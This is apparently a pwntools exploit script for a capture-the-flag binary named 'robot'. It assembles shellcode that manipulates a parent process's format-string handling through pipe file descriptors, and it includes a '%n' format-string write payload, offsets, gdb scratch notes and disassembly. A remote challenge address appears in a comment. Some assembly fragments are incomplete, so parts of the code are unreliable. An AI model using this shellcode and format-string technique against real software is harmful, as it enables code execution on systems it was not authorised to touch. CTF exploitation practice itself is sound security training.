from pwn import *

context.arch = "amd64"
'''
int pipedes[2]; // [rsp+40h] [rbp-A0h]
int v19; // [rsp+48h] [rbp-98h]
int fd; // [rsp+4Ch] [rbp-94h]
'''
parent_read_fmt_offset = 0x15d6
input_offset = 0x19cf
dprint_offset = 0x18f2

read_offset = 0x1080

# gdb to find
dprintf_read_fd = 0x3
dprintf_write_fd = 0x4
read_fd = 0x5
write_fd = 0x6

fmt_offset = 0x619000
libc_offset = 0x619000
'''
pipedes = $rbp-0xa0
fmt:
x/10g $rbp-0x00b8
v19:
x/10g $rbp-0x98
fd:
x/10g $rbp-0x94
'''
pipedes = [3, 4]

# Exploit
# r = remote('140.112.31.97', 30201)
r = process('./robot')

################################
# shellcode = '  '
input(f'ready to send shellcode')

'''
stack_addr - shellcode_addr = 0xb6bd956000
stack_addr = shellcode_addr + 0xb6bd956000
stack_addr = rdx + 0xb6bd956000
'''

'''
'''
loop = '''
    mov r14, rdx
    add r14, 0x11
    ...
    jmp r14
'''
get_base = '''
    mov r14, rdx

'''
recover_stack = ''' 
    sub rdx, 0x8000
    mov rsp, rdx
'''
write = '''
    mov rdi
    mov 
'''

shellcode = ''
shellcode += recover_stack

'''
37	25	%
83	53	S
'''

# X
shellcode += (shellcraft.amd64.write(write_fd, 'S', 0x1000).rstrip())
shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())

shellcode += '''
    mov r13, [rsp]
    shr r13, 8
    add r13, 1
    jmp .L5
.L4:
'''
shellcode += (shellcraft.amd64.write(write_fd, 'MW', 0x1000).rstrip())
shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())


shellcode += '''
    add r13, 1
.L5:
    mov rax, r13
    cmp al, 0x58
    jle .L4
'''

# %
shellcode += (shellcraft.amd64.write(write_fd, 'S', 0x1000).rstrip())
shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())

shellcode += '''
    mov r13, [rsp]
    add r13, 1
    jmp .L3
.L2:
'''
shellcode += (shellcraft.amd64.write(write_fd, 'MD', 0x1000).rstrip())
shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())

shellcode += (shellcraft.amd64.write(write_fd, 'S', 0x1000).rstrip())
shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())
# 
shellcode += '''
    add r13, 1
.L3:
    mov rax, r13
    cmp al, 0x25
    jle .L2
'''

# for i in range(ord('%') - 7):
#     shellcode += (shellcraft.amd64.write(write_fd, 'MD', 0x1000).rstrip())
#     shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())

# for i in range(ord('S') - 10):
#     shellcode += (shellcraft.amd64.write(write_fd, 'MW', 0x1000).rstrip())
#     shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())
#     shellcode += (shellcraft.amd64.write(write_fd, 'S', 0x1000).rstrip())
#     shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())

shellcode += '''
    push 0
'''

for i in range(3):
    shellcode += (shellcraft.amd64.write(write_fd, 'S', 0x1000).rstrip())
    shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp').rstrip())


# shellcode += (shellcraft.amd64.write(write_fd, 'SAAAAAA', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.push(1).rstrip())
# shellcode += (shellcraft.amd64.read(dprintf_read_fd, 'rsp', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.write(write_fd, 'G', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.read(pipedes[1], 'rdi', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.read(pipedes[1], 'rdi', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.write(inner_read_fd, 'G\n', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.read(inner_read_fd, 'rsp', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.write(inner_read_fd, 'G\n', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.write(inner_read_fd, 'G\n', 0x1000).rstrip())
# shellcode += (shellcraft.amd64.write(1, 'G', 1).rstrip())
# shellcode += (shellcraft.amd64.write(1, 'G', 1).rstrip())
# shellcode += (shellcraft.amd64.write(1, 'G', 1).rstrip())
# shellcode += (shellcraft.amd64.write(1, 'G', 1).rstrip())
# shellcode += (shellcraft.exit(87).rstrip())
shellcode += '\n'

shellcode += (shellcraft.infloop().rstrip())

# print(shellcode)
r.sendafter('Give me code :', asm(shellcode))
r.sendline('')

r.interactive()

'''
%9$p

%1073758208c%123$n

'''

'''
si
fin
fin
fin
fin
fin
fin
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
# after jmp to shell code

'''
'''
   0x561d6e84763d:      call   0x561d6e847110 <exit@plt>
   0x561d6e847642:      mov    eax,DWORD PTR [rbp-0x80]
   0x561d6e847645:      cmp    DWORD PTR [rbp-0xcc],eax
   0x561d6e84764b:      jne    0x561d6e847683
   0x561d6e84764d:      mov    eax,DWORD PTR [rbp-0x88]
   0x561d6e847653:      cmp    eax,0x1
   0x561d6e847656:      jne    0x561d6e84766d
   0x561d6e847658:      mov    eax,DWORD PTR [rbp-0x78] # sifield
   0x561d6e84765b:      test   eax,eax

waitid@plt (
    $rdi = 0x0000000000000001,
    $rsi = 0x00000000000050c0,
    $rdx = 0x00007ffcc30f5820 → 0x0000000000000000,
    $rcx = 0x0000000000000005
)

 → 0x556395ef6618                  jne    0x556395ef6642        TAKEN [Reason: !Z]
   ↳  0x556395ef6642                  mov    eax, DWORD PTR [rbp-0x80] # sifields.pad[0]: 0x50c0
      0x556395ef6645                  cmp    DWORD PTR [rbp-0xcc], eax # $rax   : 0x50c0
      0x556395ef664b                  jne    0x556395ef6683
      0x556395ef664d                  mov    eax, DWORD PTR [rbp-0x88] # si_code
      0x556395ef6653                  cmp    eax, 0x1
      0x556395ef6656                  jne    AI crashed
      0x556395ef6658:                 mov    eax,DWORD PTR [rbp-0x78]  # sifields.pad[2]: 0x50c0
      0x556395ef665b:                 test   eax,eax
      0x556395ef665d:                 jne    AI crashed
      0x556395ef665f:                 lea    rdi,[rip+0xa1f]        # 0x556395ef7085
      0x556395ef6666:                 call   0x556395ef6030 <puts@plt>
      0x556395ef666b:                 jmp    0x556395ef6679
      0x556395ef666d:                 lea    rdi,[rip+0xa1b]        # 0x556395ef708f
      0x556395ef6674:                 call   0x556395ef6030 <puts@plt>
      0x556395ef6679:                 mov    edi,0x0
      0x556395ef667e:                 call   0x556395ef6110 <exit@plt>
      0x556395ef6683:                 mov    rax,QWORD PTR [rbp-0xb8]
      0x556395ef668a:                 movzx  eax,BYTE PTR [rax]
      0x556395ef668d:                 cmp    al,0x53
      0x556395ef668f:                 jne    0x556395ef66fa
      0x556395ef6691:                 mov    eax,DWORD PTR [rbp-0xb0]
      0x556395ef6697:                 add    eax,0x1
      0x556395ef669a:                 mov    edx,eax
      0x556395ef669c:                 mov    rax,QWORD PTR [rbp-0xb8]
      0x556395ef66a3:                 mov    BYTE PTR [rax],dl
      0x556395ef66a5:                 mov    eax,DWORD PTR [rbp-0xac]
      0x556395ef66ab:                 lea    edx,[rax+0x1]
      0x556395ef66ae:                 mov    rax,QWORD PTR [rbp-0xb8]
'''
